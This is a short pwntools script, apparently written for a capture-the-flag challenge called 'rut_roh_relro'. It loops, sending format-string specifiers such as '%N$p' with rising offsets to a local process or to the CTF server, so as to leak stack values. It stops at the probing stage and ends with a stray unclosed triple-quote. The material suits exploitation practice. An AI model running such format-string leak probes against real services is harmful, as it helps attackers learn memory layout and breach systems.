#!/usr/bin/python3
from pwn import *
from time import *

exe = './rut_roh_relro'
elf = context.binary = ELF(exe)
libc = ELF("libc.so.6")

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

rem = False
v = 1
while(True):
    if(not rem):
        p = start()
    else:
        p = remote("lac.tf", 31134)

    p.recvuntil(b"?")
    p.sendline(f"%{v}$p")
    p.recvlines(2)
    print(p.recvline(), v)
    p.sendline(b"1")
    sleep(0.5)
    v += 1

p.interactive()
'''

'''